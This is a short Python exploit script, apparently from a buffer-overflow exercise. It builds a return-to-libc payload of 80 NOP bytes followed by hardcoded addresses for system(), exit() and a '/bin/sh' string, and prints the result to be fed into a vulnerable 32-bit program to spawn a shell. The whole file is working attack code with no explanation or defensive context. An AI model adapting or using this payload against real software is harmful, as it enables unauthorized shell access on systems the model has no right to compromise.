import struct
payload = "\x90"*80
system = struct.pack("I", 0xb7ecffb0)
exit = struct.pack("I", 0xb7ec60c0)
binsh = struct.pack("I",0xb7fb63bf)
print(payload+system+exit+binsh)
